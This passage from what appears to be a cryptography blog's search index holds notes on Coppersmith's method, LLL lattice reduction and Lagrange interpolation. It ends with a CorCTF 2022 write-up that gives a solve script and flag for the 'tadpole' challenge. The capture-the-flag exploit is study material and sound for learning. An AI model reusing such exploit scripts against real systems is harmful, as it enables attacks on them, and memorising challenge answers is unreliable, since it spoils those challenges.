的子区间，这样的子区间符合前文讨论的初等情况,那么运行 $c$ 次，便可以找出这个较大区间内的所有符合条件的根。 ","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:5:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"$\\beta$ 指数变换： 直接应用 $N$ 的一个较小因子而非 $N$ 本身,可以在时间复杂度上 ","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:6:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"$\\epsilon$ 一类特殊情况下的分析，引入了 $\\epsilon$ . 由于更换了参考文献，符号有所更改. $M = N,d= \\delta$ 其他保持一致即可。 不难发现, $\\frac{1}{2}N^{\\frac{1}{d}-\\epsilon}$ 相对于 $cN^{\\frac{\\beta^2}{\\delta}}$ 的形式，这里给出了 $c=\\frac{1}{2},\\beta = 1$, 又在 $\\beta$ 其后增加了 $-\\epsilon$ . 同时给定了限制： $$ 0 \\lt \\epsilon \\lt \\min{0.18, 1/d} $$ 证明到这里已经写明所引参数 $h$ 同待证明命题参数 $\\epsilon$ , 而此时可以考虑应用条件 $X \\lt \\frac{1}{2}M^{1/d -\\epsilon}$ . 进一步的，在实际参数中引入了 $m,t$ 来控制移位多项式，来构建 $\\mathcal{L}$ . 具体可参见所附代码. ","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:7:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"Open problem 至此，单变量的coppersmith求解小根问题的思考可以完美落幕。而格的优化亦或是求解公共根时的算法更改又是另一个新的问题了。 small_root in sage def small_roots(self, X=None, beta=1.0, epsilon=None, **kwds): \"\"\" Let `N` be the characteristic of the base ring this polynomial is defined over: ``N = self.base_ring().characteristic()``. This method returns small roots of this polynomial modulo some factor `b` of `N` with the constraint that `b \u003e= N^\\beta`. Small in this context means that if `x` is a root of `f` modulo `b` then `|x| \u003c X`. This `X` is either provided by the user or the maximum `X` is chosen such that this algorithm terminates in polynomial time. If `X` is chosen automatically it is `X = ceil(1/2 N^{\\beta^2/\\delta - \\epsilon})`. The algorithm may also return some roots which are larger than `X`. 'This algorithm' in this context means Coppersmith's algorithm for finding small roots using the LLL algorithm. The implementation of this algorithm follows Alexander May's PhD thesis referenced below. INPUT: - ``X`` -- an absolute bound for the root (default: see above) - ``beta`` -- compute a root mod `b` where `b` is a factor of `N` and `b \\ge N^\\beta`. (Default: 1.0, so `b = N`.) - ``epsilon`` -- the parameter `\\epsilon` described above. (Default: `\\beta/8`) - ``**kwds`` -- passed through to method :meth:`Matrix_integer_dense.LLL() \u003csage.matrix.matrix_integer_dense.Matrix_integer_dense.LLL\u003e`. EXAMPLES: First consider a small example:: sage: N = 10001 sage: K = Zmod(10001) sage: P.\u003cx\u003e = PolynomialRing(K, implementation='NTL') sage: f = x^3 + 10*x^2 + 5000*x - 222 This polynomial has no roots without modular reduction (i.e. over `\\ZZ`):: sage: f.change_ring(ZZ).roots() [] To compute its roots we need to factor the modulus `N` and use the Chinese remainder theorem:: sage: p,q = N.prime_divisors() sage: f.change_ring(GF(p)).roots() [(4, 1)] sage: f.change_ring(GF(q)).roots() [(4, 1)] sage: crt(4, 4, p, q) 4 This root is quite small compared to `N`, so we can attempt to recover it without factoring `N` using Coppersmith's small root method:: sage: f.small_roots() [4] An application of this method is to consider RSA. We are using 512-bit RSA with public exponent `e=3` to encrypt a 56-bit DES key. Because it would be easy to attack this setting if no padding was used we pad the key `K` with 1s to get a large number:: sage: Nbits, Kbits = 512, 56 sage: e = 3 We choose two primes of size 256-bit each:: sage: p = 2^256 + 2^8 + 2^5 + 2^3 + 1 sage: q = 2^256 + 2^8 + 2^5 + 2^3 + 2^2 + 1 sage: N = p*q sage: ZmodN = Zmod( N ) We choose a random key:: sage: K = ZZ.random_element(0, 2^Kbits) and pad it with 512-56=456 1s:: sage: Kdigits = K.digits(2) sage: M = [0]*Kbits + [1]*(Nbits-Kbits) sage: for i in range(len(Kdigits)): M[i] = Kdigits[i] sage: M = ZZ(M, 2) Now we encrypt the resulting message:: sage: C = ZmodN(M)^e To recover `K` we consider the following polynomial modulo `N`:: sage: P.\u003cx\u003e = PolynomialRing(ZmodN, implementation='NTL') sage: f = (2^Nbits - 2^Kbits + x)^e - C and recover its small roots:: sage: Kbar = f.small_roots()[0] sage: K == Kbar True The same algorithm can be used to factor `N = pq` if partial knowledge about `q` is available. This example is from the Magma handbook: First, we set up `p`, `q` and `N`:: sage: length = 512 sage: hidden = 110 sage: p = next_prime(2^int(round(length/2))) sage: q = next_prime( round(pi.n()*p) ) sage: N = p*q Now we disturb the low 110 bits of `q`:: sage: qbar = q + ZZ.random_element(0,2^hidden-1) And try to recover `q` from it:: sage: F.\u003cx\u003e = PolynomialRing(Zmod(N), implementation='NTL') sage: f = x - qbar We know that the error is `\\le 2^{\\text{hidden}}-1` and that the modulus we are looking for is `\\ge \\sqrt{N}`:: sage: from sage.misc.verbose import set_verbose sage: set_verbose(2) sage: d = f.small_roots(X=2^hidden-1, beta=0.5)[0] # time random verbose 2 (\u003cmodule\u003e) m = 4 verbose 2 (\u003cmodule\u003e) t = 4 verbose 2 (\u003cmodule\u003e) X = 1298074214633706907132624082305023 verbose 1 (\u003cmodule\u003e) LLL of 8x8 matrix (algorithm fpLLL:wrapper) verbo","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:8:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"Regev讲义学习笔记 ","date":"2024-05-26","objectID":"/lattice-part-1/:0:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"Everything Before ​ 我们的目标是求解近似求解SVP问题，基于此构建了一个具有特殊结构的基，为了构建这样的代数结构，设计出一类规约算法，并验证了正确性和时间复杂度的可行性。基于这样的思路，可以在规约算法上进行优化，在代数结构上进行调整，获得更好的近似求解表现。 ​ 在具有这样的清晰思路后，再来考虑代数工具的构建，将会使工作更加完善。 ","date":"2024-05-26","objectID":"/lattice-part-1/:1:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"Reduced Basis 注意到 将一个普通正交基，规约为一个约简基总是可以的。 给出这样的定义，实则是基于我们的研究对象一些代数上表现良好的结构，使得可以很好的利用这样的约简基，配合闵可夫斯基界，我们可以给出一个SVP的近似求解，对于近似精度，我们再利用参数 $\\delta$ 来进行很好的刻画，在后面的学习中将会看到这里的 $\\delta = \\frac{3}{4}$ 时，会得到一个非常良好的规约结果。 利用简单的三角不等式: $$ \\begin{cases} \\delta{\\Vert\\tilde{b_{i}}\\Vert}^{2}\\leq{\\Vert\\mu_{i+1,i}\\tilde{b_{i}}+\\tilde{b_{i+1}}\\Vert}^{2}=\\mu_{i+1,i}^{2}{\\Vert\\tilde{b_{i}}\\Vert}^{2}+{\\Vert\\tilde{b_{i+1}}\\Vert}^{2} \\tag{1} \\\\ \\Vert\\tilde{b_{i+1}}\\Vert^2\\geq(\\delta-\\mu_{i+1,i}^2)\\Vert\\tilde{b_i}\\Vert^2\\geq(\\delta-\\frac{1}{4})\\Vert\\tilde{b_i}\\Vert^2 \\end{cases} $$ 实际上，我们的格工作在 $p$ 范数空间。 进一步的,$(1)$，说明了两个相邻基向量不会相差太大 Schmit process中，不难发现， 所得到的基向量列向量优先可以得到，如下矩阵 即 从 $$ \\tilde{b_i}=b_i-\\sum_{j=1}^{i-1}\\mu_{i,j}\\tilde{b_j},where\\mu_{i,j}=\\frac{\\langle b_i,\\tilde{b_j}\\rangle}{\\langle\\tilde{b_j},\\tilde{b_j}\\rangle}. $$ 到如下矩阵的一个转变 $$ \\begin{pmatrix}\\Vert\\tilde{b_1}\\Vert\u0026 * \u0026\\cdots\u0026 * \\\\ 0\u0026\\Vert\\tilde{b_2}\\Vert\u0026\\cdots\u0026 * \\\\ \\vdots\u0026\u0026\\ddots\u0026\\vdots \\\\ \u0026\u0026\u0026 * \\\\ 0\u0026\\cdots\u0026\u0026\\Vert\\tilde{b_n}\\Vert\\end{pmatrix} $$ 当 $\\delta = \\frac{3}{4}$ 时，所得矩阵概览便为： $$ \\begin{pmatrix}\\Vert\\tilde{b_1}\\Vert\u0026\\leq\\frac12\\Vert\\tilde{b_1}\\Vert\u0026\\cdots\u0026\u0026\\leq\\frac12\\Vert\\tilde{b_1}\\Vert \\\\ 0\u0026\\Vert\\tilde{b_2}\\Vert\u0026\\cdots\u0026\u0026\\leq\\frac12\\Vert\\tilde{b_2}\\Vert \\\\ \\vdots\u0026\u0026\\ddots\u0026\u0026\\vdots \\\\ \u0026\u0026\u0026\u0026\\leq\\frac12\\Vert\\tilde{b_{n-1}}\\Vert \\\\ 0\u0026\\cdots\u0026\u0026\u0026\\Vert\\tilde{b_n}\\Vert\\end{pmatrix} $$ 以上的工作均是在 Gram-Schmit 做微调下，实现这样的结果，但是直到现在我们尚未把所做工作同 SVP-approximation 联系起来。 ","date":"2024-05-26","objectID":"/lattice-part-1/:2:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"What can LLL do? 更清晰的来说： ","date":"2024-05-26","objectID":"/lattice-part-1/:3:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"Short Vector and Reduced basis 接下来我们证明CLAIM 1. 为了用符号语言的形势推导，我们引入 $\\lambda_i$, 也是格中最为基础的参数之一。 针对这一定义可推导出 $\\lambda_1(\\mathcal{L}(B))\\geq\\min_{i=1,…,n}\\Vert\\tilde{b}_i\\Vert\u003e0.$ 施密特正交化处理所得正交基向量的范数一定小于等于第一最短向量。 同样的，直觉的感受需要同形式化的证明相结合，利用求和符号、范数、正交的一些性质可得到 PROOF: Let $x\\in\\mathbb{Z^n}$ be an arbitrary nonzero integer vector, and let us show that $\\Vert Bx \\Vert \\geq \\min{\\Vert\\tilde{b_i}\\Vert}.$ Let $j\\in{1,\\ldots,n}$ be the largest such that $x_j \\neq 0.$ Then $$ |\\langle Bx,\\tilde{b_j}\\rangle|=|\\langle\\sum_{i=1}^jx_ib_i,\\tilde{b_j}\\rangle|=|x_j|\\langle\\tilde{b_j},\\tilde{b_j}\\rangle=|x_j|\\Vert\\tilde{b_j}\\Vert^2 $$ where we used that for all $i\u003cj,\\langle b_i,\\tilde{b_j}\\rangle=0$ and that $\\langle b_j,\\tilde{b_j}\\rangle=\\langle\\tilde{b_j},\\tilde{b_j}\\rangle.$ On the other hand, $\\Vert \\langle Bx,\\tilde{b_j}\\rangle \\Vert \\leq \\Vert Bx \\Vert \\cdot \\Vert\\tilde{b_j}\\Vert$, (Cauchy-Schwarz Inequality) ,and hence we conclude that $$ \\Vert Bx \\Vert \\geq |x_j| \\Vert\\tilde{b_j}\\Vert\\geq\\Vert\\tilde{b_j}\\Vert\\geq \\min{\\Vert\\tilde{b_i}\\Vert.} $$ 这里需要指明的是 $Bx$ 可视为 $x$ 经线性变换 $B$, 得到在变换后空间中的表示。 即可以可逆矩阵 $B$ 作为线性变换，可以视为一种映射。 进一步的 ","date":"2024-05-26","objectID":"/lattice-part-1/:3:1","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"PROOF The Claim 回顾刚刚的CLAIM1: 至此，应用 $\\lambda$ 的性质，以及施密特正交基的最短 ( $l_2$ 意义上) 基向量与 $\\lambda_1(\\mathcal{L})$ 的关系，利用简单的系数放缩，便可以完成证明，也同时很好的将我们最开始定义 Reduced Basis 的工作同 SVP 问题相结合。 PROOF: Since for any basis $b_1,\\ldots,b_n,\\lambda_1(\\mathcal{L})\\geq\\min_i\\Vert\\tilde{b_i}\\Vert$,we get that $$ \\Vert\\tilde{b_n}\\Vert^{2} \\geq(\\delta-\\frac{1}{4})\\Vert\\tilde{b_{n-1}}\\Vert^{2} \\geq \\ldots \\geq(\\delta-\\frac14)^{n-1} \\Vert\\tilde{b_1}\\Vert^{2} =(\\delta-\\frac{1}{4})^{n-1}\\Vert b_{1} \\Vert^2 $$ where the last equality follows by the definition $\\tilde{b_1}=b_1.$ Then, for any $i$, $$ \\Vert\\tilde{b_1}\\Vert\\leq\\left(\\delta-\\frac14\\right)^{-(i-1)/2}\\Vert\\tilde{b_i}\\Vert\\leq\\left(\\delta-\\frac14\\right)^{-(n-1)/2}\\Vert\\tilde{b_i}\\Vert. $$ Hence, $$ \\Vert b_{1} \\Vert \\leq \\left(\\delta-\\frac{1}{4}\\right)^{-(n-1)/2} \\min_i{\\Vert\\tilde{b_i}\\Vert} \\leq \\left(\\delta-\\frac{1}{4}\\right)^{-(n-1)/2} \\cdot \\lambda_{1}(\\mathcal{L}) $$ 对于 $\\delta = \\frac{3}{4}$ 的情况，代入即可: 此时，我们已经说明了一个代数结构，很好的符合了我们 SVP-Approximation 的出发点，于此我们引入算法上的工作，这包含了算法设计与时间复杂度分析。时间分析这部分暂略过，值得注意的是 LLL 的表现好于保守分析的结果。 ","date":"2024-05-26","objectID":"/lattice-part-1/:3:2","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"Way to LLL 也即我们现在要完成一个矩阵到矩阵的变换。 初等列变换保证矩阵的可逆性，加入线性乘子保障范数符合条件。在施密特正交化过程中加入 REMARK 6 ，保证了这里的系数 $\\frac{1}{2}$ , 而 SWAP 过程保证 约简基性质2. 严格意义上的 ","date":"2024-05-26","objectID":"/lattice-part-1/:4:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"Open Probelm ","date":"2024-05-26","objectID":"/lattice-part-1/:5:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"Application 我们将继续深入探究格规约所带来的全新分析视角。 ","date":"2024-05-26","objectID":"/lattice-part-1/:6:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"Reference Regev讲义 Lattices in Cryptography ","date":"2024-05-26","objectID":"/lattice-part-1/:7:0","tags":[],"title":"Lattice Part 1","uri":"/lattice-part-1/"},{"categories":[],"content":"从拉格朗日插值法到FFT. Part-0. 系数表示法和点值表示法 ","date":"2024-05-25","objectID":"/waytofft-part-0/:0:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"系数表示法 多项式可简略定义为，形如$\\Sigma_{i=0}^{n}a_{i}x^{i}$的有限和式为多项式，记作$f(x)= \\Sigma_{i=0}^{n}a_{i}x^{i}$其中$a_{i}$称为$i$次项目的系数。 这种表示方法称为系数表示法 ","date":"2024-05-25","objectID":"/waytofft-part-0/:1:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"点值表示法 将$x = x_{i}$代入，得到序列$(x_{i},y_{i})$，此序列用于描述多项式时，称为点值表示法$0 \\le i \\le n+1$,可以唯一描述一个$n$次多项式。 考虑这两种表示法之间的联系。 在给定$n$个点值$(x_{0},y_{0}),(x_{1},y_{1}),\\dots,(x_{n-1},y_{n-1})$其中$x_{i}$互不相等时，所唯一确定的多项式最高次数为 $n-1$次。 证明:考虑$n$阶方阵 $$A =\\begin{bmatrix}1\u0026x_0\u0026x_0^1\u0026\\cdots\u0026x_0^{n-1} \\\\ 1\u0026x_1\u0026x_1^1\u0026\\cdots\u0026x_1^{n-1} \\\\ 1\u0026x_2\u0026x_2^1\u0026\\cdots\u0026x_2^{n-1} \\\\ \\vdots\u0026\\vdots\u0026\\vdots\u0026\\ddots\u0026\\vdots \\\\ 1\u0026x_{n-1}\u0026x_{n-1}^2\u0026\\cdots\u0026x_{n-1}^{n-1}\\end{bmatrix} ,x=\\begin{bmatrix} a_{0} \\\\ a_{1} \\\\ a_{2} \\\\ \\vdots \\\\ a_{n-1} \\end{bmatrix}$$ $x_{i}$互不相同，$\\det A \\ne 0$，故方程有唯一解，则可唯一确定一组系数$a_{i}$ 系数表示 -\u003e 点值表示 求值（evaluation) 点值表示 -\u003e 系数表示 插值(interpolation) 拉格朗日插值 ","date":"2024-05-25","objectID":"/waytofft-part-0/:2:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"定义 对于某个$n$次多项式函数$f$，已知给定点值表示$(x_{i},y_{i})$ $$\\mathscr{L} (x) := \\sum_{i=0}^{n} y_{i} \\mathscr{l}_{i} (x)$$ 其中每个$\\mathscr{l}$称为 拉格朗日基本多项式（插值基函数）: $$\\mathscr{l_{i}} (x) := \\prod_{i=0,j \\ne i}^{n} \\frac{x-x_{j}}{x_{i}-x_{j}}= \\frac{(x-x_{0})\\cdots(x-x_{n})}{(x_{i}-x_{0})\\cdots (x-x_{i-1})(x-x_{i+1})\\cdots(x-x_{n}) }$$ ","date":"2024-05-25","objectID":"/waytofft-part-0/:3:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"存在性 由点值表示得知目标多项式一定存在，那么对于拉格朗日基本多项式, 对于$i=s,(x_{s},y_{s})$得到 $$\\mathscr{l_{i}} (x_{s}) = 1$$ 那么可以满足 $$y_{s}\\mathscr{l_{i}} (x_{s}) = y_{s}$$ 进而构造 $$\\mathscr{L} (x) := \\sum_{i=0}^{n} y_{i} \\mathscr{l_{i}} (x)$$ ","date":"2024-05-25","objectID":"/waytofft-part-0/:3:1","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"唯一性 次数不超过$n$的拉格朗日多项式$\\mathscr{L} (x)$至多只有一个。 证明： 对于在$n+1$个点上取值均为零的多项式，有 $$P_{i}(x)= k \\prod_{i=0}^{n}(x-x_{i}) \\tag{1}$$ 对任意两个次数不超过$n$的拉格朗日多项式:$P_{1}$和$P_{2}$,作差得 $$\\Delta(x)=P_{1}(x)-P_{2}(x) \\tag{2}$$ 那么由$(1),(2)$式知， $i.$ 若$\\Delta(x) =0$， 则$P_{1}(x) =P_{2}(x)$，即多项式系数$k$唯一 $ii.$ 若$\\Delta(x) \\ne 0$, 则$\\min(\\deg(P_{1},P_{2})) \\gt n$ 对应范德蒙矩阵 $rank = n$时有唯一解 $rank \\lt n$ 有无穷多解 ","date":"2024-05-25","objectID":"/waytofft-part-0/:3:2","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"拉格朗日插值与向量空间 线性空间： $\\mathbb{K_{n}}[X]$, 经由拉格朗日插值法，可以找到一组基，由拉格朗日基本多项式$\\mathscr{l_{0}},\\mathscr{l_{1}},\\dots,\\mathscr{l_{n}}$组成,使得 $$P=\\prod_{i = 0}^{n} \\lambda_{i} \\mathscr{l}{i}=0$$ 那么，对于多项式$P(x{i})=\\lambda_{i}$的拉格朗日插值多项式，与零多项式$P$。 可得: $$\\lambda_{0} = \\lambda_{1} = \\dots =\\lambda_{n} = 0$$ 则$\\mathscr{l_{0}},\\mathscr{l_{1}},\\dots,\\mathscr{l_{n}}$线性无关，同时包含$n+1$个多项式： 故可作为$\\mathbb{K_{n}}[X]$的一组基底，且构造了一组齐次基。 ","date":"2024-05-25","objectID":"/waytofft-part-0/:3:3","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"核心思想 利用点值的可加性，每次仅考虑一个点值，其他值均为0，由此构造n个多项式$f_{i}(x)$，使得它们在$x_{i}$对应处值为$y_{i}$。则$f = \\sum^{n-1}{0} f{i}(x)$。 构造其他点值为$0$, 必含有因子$\\prod_{i \\ne j}^{}(x-x_{j})$ 构造$f_{i}(x) = y_{i}$,调整系数，数乘$\\frac{y_{i}}{f_{i}(x)}$ 各构造多项式累加 得到插值最终表达式： $$ f(x) = \\sum_{i=0}^{n-1}y_{i} \\prod_{j \\ne i}^{} \\frac{x - x_{j}}{x_{i} - x_{j}}$$ 为了得到$f$的各项系数，需要$O(n^{2})$求出 $$F(x)=\\prod_{i = 0}^{n-1}(x-x_{i})$$。 已知$n-1$, 那么各个$x_{i}$均已知，行列式系数范德蒙矩阵可知。 若已知$y_{i}$则求系数问题可转化为线性方程组求解问题。 真对上述问题作变式： $n-1$ 、序列$1,2,3,\\dots,x_{n-1}$,$y_{0},\\dots,y_{n-1}$,已知，可唯一确定多项式。 那么可以知晓，拉格朗日插值可求得范德蒙矩阵的逆矩阵。 范德蒙矩阵的拉格朗日逆 拉格朗日插值根据多项式的点值表示，以及多项式次数唯一确定多项式系数。 $$V ·A = Y$$ 即根据Vandermonde矩阵，点值向量$V,Y$确定系数向量$A=(a_{0},\\dots ,a_{n})$ $$A = V^{-1}Y$$ 本节将会探究这样求值的具体形式化表达。 ","date":"2024-05-25","objectID":"/waytofft-part-0/:4:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"范德蒙行列式 范德蒙行列式，即范德蒙矩阵的行列式 $$M = \\begin{vmatrix}1\u00261\u0026\\cdots\u00261 \\\\ a_1\u0026a_2\u0026\\cdots\u0026a_n \\\\ a_1^2\u0026a_2^2\u0026\\cdots\u0026a_n^2 \\\\ \\vdots\u0026\\vdots\u0026\\ddots\u0026\\vdots \\\\ a_1^{n-1}\u0026a_2^{n-1}\u0026\\cdots\u0026a_n^{n-1}\\end{vmatrix}$$ 即: $$M = M^{T}=\\prod_{1\\leq j\u003ci\\leq n}(a_i-a_j)$$ 克拉默法则: $n$元线性方程组的系数行列式$|A|\\ne {0}$,则有唯一解，形式表达为: $$\\begin{align}AX\u0026= B \\\\ A \u0026=(a_{0},a_{1},a_{2},\\dots,a_{n}) \\tag{0} \\\\ a_{i}\u0026= ( a_{0i},a_{1i},\\dots,a_{(n-1)i})^{T} \\\\ B \u0026= ( b_{0}, b_{1}, \\cdots ,b_{n})^{T}\\end{align}$$ 可以确定唯一解的形式： $$X =\\left( \\frac{|\\mathbf{B_1}|}{|\\mathbf{A}|},\\frac{|\\mathbf{B_2}|}{|\\mathbf{A}|},\\cdots,\\frac{|\\mathbf{B_n}|}{|\\mathbf{A}|}\\right)^{T}$$ 其中 $$B_{i} = (a_{0},a_{1},a_{i-1},B,a_{i+1},a_{n})$$ ","date":"2024-05-25","objectID":"/waytofft-part-0/:5:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"范德蒙方阵及其转置的行列式 对于多项式: $$f(x)=\\sum_{i=0}^{n} a_{i}x^{i}\\tag{1}$$ 首先改写为首一多项式 $$f(x)= \\sum_{i=0}^{n-1} a_{i}^{'}x^{i} + x^{n}, a_{i}^{'}= \\frac{a_{i}}{a_{n}}\\tag{2}$$ 应用代数基本定理，则首一多项式$f(x)$又可写作： $$f(x)= \\prod_{i=0}^{n}(x-x_{i}) \\tag{3}$$ 韦达定理对称多项式表达： $$\\begin{cases} a_{0} \u0026= (-1)^{n} \\sigma_{n}(x_{1},x_{2},\\dots,x_{n}) \\\\ \\cdots \\\\ a_{k} \u0026= (-1)^{n-k} \\sigma_{k}(x_{1},x_{2},\\dots,x_{n}) \\\\ \\cdots \\\\ a_{n-1} \u0026= (-1)^{1}\\sigma_{1}(x_{1},x_{2},\\dots,x_{n}) \\end{cases}$$ 可以归纳为: $$a_{i}=(-1)^{n-i}\\sigma_{n-i}(x_{1},x_{2},\\dots,x_{n})\\tag{4}$$ ","date":"2024-05-25","objectID":"/waytofft-part-0/:6:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"推导拉格朗日逆 ","date":"2024-05-25","objectID":"/waytofft-part-0/:7:0","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"推出拉格朗日插值表达 由克拉默法则导出线性方程组$(0)$的一般解： $$a_{j}= \\frac{|B_{j}|}{|A|}$$ 从而 $$f(x)= \\sum_{j=0}^{n} \\frac{|B_{j}|}{|A|}x^{j}$$ 将$|B+j|$按照第$j+1$列展开： $$B_{j}= \\sum_{j=0}^{n}y_{i}A_{ij}$$ 反代$f(x)$中，并作二次求和的交换： $$f(x)=\\sum_{j=0}^n\\frac{\\sum_{i=0}^{n}y_i\\mathbf{A_{ij}}}{|\\mathbf{A}|}x^j=\\sum_{i=0}^{n} y_{i} \\frac{\\sum_{j=0}^{n}x^{j}\\mathbf{A_{ij}}}{|\\mathbf{A}|}$$ 胜利的曙光即将到来： $$\\sum_{j=0}^{n} x^{j}\\mathbf{A_{ij}} = \\begin{vmatrix} 1 \u0026 x_{0}\u0026x_{0}^{2}\u0026\\cdots\u0026x_{0}^{n} \\\\ \\vdots\u0026\\vdots\u0026\\vdots\u0026\\ddots\u0026\\vdots \\\\ 1\u0026x_{i-1}\u0026x_{i-1}^{2}\u0026\\cdots\u0026x_{i-1}^{n} \\\\ 1\u0026x\u0026x^{2}\u0026\\cdots\u0026x^{n} \\\\ 1\u0026x_{i+1}\u0026x_{i+1}^{2}\u0026\\cdots\u0026x_{i+1}^{n} \\\\ \\vdots\u0026\\vdots\u0026\\vdots\u0026\\ddots\u0026\\vdots \\\\ 1\u0026x_{n}\u0026x_{n}^{2}\u0026\\cdots\u0026x_{n}^{n}\\end{vmatrix}$$ 推导并,调整下标$i,j$得到： $$\\mathscr{l_{i}}(x)=\\frac{\\sum_{i=0}^{n}x^i\\mathbf{A_{ji}}}{|\\mathbf{A}|}$$ 从而推出拉格朗日表达： $$\\mathscr{L} (x):= \\sum_{i=0}^{n} y_{i} \\mathscr{l_{i}} (x)$$ ","date":"2024-05-25","objectID":"/waytofft-part-0/:7:1","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"推出拉格朗日逆 范德蒙方阵逆矩阵： 对于范德蒙方阵$V$,其对角线元素$a_{0},\\dots,a_{n-1} \\ne 0$时，有唯一逆矩阵$V^{-1}$。 可计算知： $$\\det V^{-1} = \\prod_{1 \\le i \\lt j \\le n}^{} \\frac{1}{a_{i}-a_{j}}$$ 而对于工程上，无论是克拉默法则，还是更易计算机实践的高斯消元，在求解$V^{-1}$时，都过于复杂，难以应用。 利用韦达定理对称多项式表达展开拉格朗日插值公式： $$\\begin{aligned} \\mathscr{L}(x) \u0026= \\sum_{i=0}^{n} y_{i} \\mathscr{l_{i}}(x) \\\\ \\mathscr{l_{i}}(x) \u0026= \\prod_{i=0,j \\ne i}^{n} \\frac{x-x_{j}}{x_{i}-x_{j}}= \\frac{(x-x_{0})\\cdots(x-x_{n})}{(x_{i}-x_{0})\\cdots (x-x_{i-1})(x-x_{i+1})\\cdots(x-x_{n}) } \\\\ \\mathscr{L}(x) \u0026= \\sum_{j=0}^{n} y_{i} \\frac{\\sum_{i=0}^{n} \\sigma_{i}x^{n-i}}{\\prod_{i=0}^{n}(a_{i}-a_{j})} \\end{aligned}$$ Reference https://www.luogu.com.cn/blog/AlexWei/Polynomial---Lagrange-Interpolation-and-Fast-Fourier-transform https://zhuanlan.zhihu.com/p/397342283 ","date":"2024-05-25","objectID":"/waytofft-part-0/:7:2","tags":[],"title":"WayToFFT Part 0","uri":"/waytofft-part-0/"},{"categories":[],"content":"Interesting Crypto LCG problem from CorCTF 2022 ","date":"2024-04-06","objectID":"/fix-point/:0:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"tadpole 没什么复杂的代数变换 from Crypto.Util.number import bytes_to_long, isPrime from secrets import randbelow p = bytes_to_long(open(\"flag.txt\", \"rb\").read()) assert isPrime(p) a = randbelow(p) b = randbelow(p) def f(s): return (a * s + b) % p print(\"a = \", a) print(\"b = \", b) print(\"f(31337) = \", f(31337)) print(\"f(f(31337)) = \", f(f(31337))) exp: from Crypto.Util.number import long_to_bytes a = 7904681699700731398014734140051852539595806699214201704996640156917030632322659247608208994194840235514587046537148300460058962186080655943804500265088604049870276334033409850015651340974377752209566343260236095126079946537115705967909011471361527517536608234561184232228641232031445095605905800675590040729 b = 16276123569406561065481657801212560821090379741833362117064628294630146690975007397274564762071994252430611109538448562330994891595998956302505598671868738461167036849263008183930906881997588494441620076078667417828837239330797541019054284027314592321358909551790371565447129285494856611848340083448507929914 z1 = 52926479498929750044944450970022719277159248911867759992013481774911823190312079157541825423250020665153531167070545276398175787563829542933394906173782217836783565154742242903537987641141610732290449825336292689379131350316072955262065808081711030055841841406454441280215520187695501682433223390854051207100 z2 = 65547980822717919074991147621216627925232640728803041128894527143789172030203362875900831296779973655308791371486165705460914922484808659375299900737148358509883361622225046840011907835671004704947767016613458301891561318029714351016012481309583866288472491239769813776978841785764693181622804797533665463949 s = 31337 f1 = z1 - (a * s + b) f2 = z2 - (a * (a * s + b) + b) p = gcd(f1, f2) print(long_to_bytes(int(p)).decode()) # corctf{1n_m4th3m4t1c5,_th3_3ucl1d14n_4lg0r1thm_1s_4n_3ff1c13nt_m3th0d_f0r_c0mput1ng_th3_GCD_0f_tw0_1nt3g3rs} ","date":"2024-04-06","objectID":"/fix-point/:1:0","tags":[],"title":"Fix Point","uri":"/fix-point/"},{"categories":[],"content":"Luckyguess #!/usr/local/bin/python from random import getrandbits p = 2**521 - 1 a = getrandbits(521) b = getrandbits(521) print(\"a =\", a) print(\"b =\", b) try: x = int(input(\"enter your starting point: \")) y = int(input(\"alright, what's your guess? \")) except: print(\"?\") exit(-1) r = getrandbits(20) for _ in range(r): x = (x * a + b) % p if x == y: print(\"wow, you are truly psychic! here, have a flag:\", open(\"flag.txt\").read()) else: print(\"sorry, you are not a true psychic... better luck next time\") 求解： 形式上来看似乎是一个LCG相关问题 $$ x_{n+1} = x_{n}a + b \\pmod{p} $$ 问题在于r = getrandbits(20) 似乎无法预测，然而可以从数列的角度简单理解一下这道题。 这个oracle 